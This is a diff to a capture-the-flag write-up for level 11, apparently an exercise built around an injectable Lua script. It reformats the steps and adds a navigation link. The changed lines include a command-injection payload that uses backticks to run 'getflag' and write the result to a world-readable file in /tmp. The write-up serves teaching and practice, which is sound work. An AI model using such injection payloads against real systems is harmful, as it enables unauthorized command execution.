@@ -70,10 +70,10 @@ cat level11.lua
 
 #### Step 2:
 
-- To make it work, the final command that is executed can be:
-```bash
-echo `getflag > /tmp/flag && chmod 777 /tmp/flag` | sha1sum
-```
+> To make it work, the final command that is executed can be:
+> ```bash
+> echo `getflag > /tmp/flag && chmod 777 /tmp/flag` | sha1sum
+> ```
 
 - Let's try to inject a command to get the flag:
 ```bash
@@ -95,4 +95,4 @@ cat /tmp/flag
 
 ---
 
-[<<](/level10/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>
+[<<](/level10/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level12/resources/Readme.md)
